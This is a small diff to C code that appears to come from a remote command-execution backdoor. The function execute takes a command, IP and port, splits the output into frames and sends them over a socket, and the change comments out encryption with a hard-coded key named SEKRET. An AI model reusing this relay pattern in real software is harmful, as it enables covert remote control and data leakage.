@@ -156,17 +156,17 @@ void execute(char *command, u_int32_t ip, u_int16_t port, int duplex)
 			char *ptr;
 			int fram_len;
 
-			ptr = resp + i;
+			ptr = trans + i;
 
 			fram_len = (tot_len - i > 8) ? FRAM_SZ : tot_len - i;
 
 			memcpy(frame, ptr, fram_len);
 
-			enc = encrypt(SEKRET, frame, FRAM_SZ);
+//			enc = encrypt(SEKRET, frame, FRAM_SZ);
 
-			sendto(sock, enc, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
+			sendto(sock, frame, FRAM_SZ, 0, (struct sockaddr *)&saddr, sizeof(saddr));
 
-			free(enc);
+//			free(enc);
 		}
 
 		free(trans);
